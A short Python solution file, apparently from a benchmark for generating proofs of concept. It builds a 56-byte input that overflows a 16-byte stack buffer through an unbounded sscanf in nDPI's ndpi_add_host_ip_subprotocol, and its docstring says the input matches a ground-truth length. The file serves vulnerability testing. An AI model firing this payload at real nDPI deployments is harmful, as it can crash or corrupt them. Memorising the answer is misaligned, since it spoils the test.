import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow in ndpi_add_host_ip_subprotocol.
        
        Vulnerability Analysis:
        - Function: ndpi_add_host_ip_subprotocol in src/lib/ndpi_main.c
        - Issue: Unbounded sscanf writing to 'tail' buffer (allocated 16 bytes).
        - Format String: "%s %s" (expects IP and Protocol/Comment strings).
        - Trigger: Providing a second string significantly longer than 16 bytes causes a stack overflow.
        
        Payload Construction:
        - Target Length: 56 bytes (matches ground truth).
        - Prefix: "1.1.1.1 " (8 bytes) - A valid-looking IP and a separator space.
        - Overflow: 48 bytes of 'A's.
        - Logic: 48 bytes written to a 16-byte buffer overflows by 32 bytes, sufficient to corrupt the stack (saved RBP + Return Address).
        """
        
        # Valid IP + Space separator (8 bytes)
        prefix = b"1.1.1.1 "
        
        # Calculate remaining bytes to match ground truth length of 56
        # 56 - 8 = 48 bytes
        overflow_length = 56 - len(prefix)
        
        # Construct the payload
        payload = prefix + b"A" * overflow_length
        
        return payload